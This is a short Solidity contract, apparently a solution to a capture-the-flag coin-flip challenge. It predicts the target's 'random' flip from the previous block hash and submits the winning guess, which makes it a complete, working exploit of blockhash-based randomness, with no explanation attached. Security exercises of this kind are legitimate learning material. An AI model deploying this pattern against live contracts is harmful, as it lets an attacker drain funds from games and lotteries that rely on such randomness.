// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract SafeFlip {
    function safeFlip(CoinFlip coinFlip) public {
        bool guess = uint256(blockhash(block.number - 1)) >> 255 == 1;
        require(coinFlip.flip(guess), "Guess failed");
    }
}
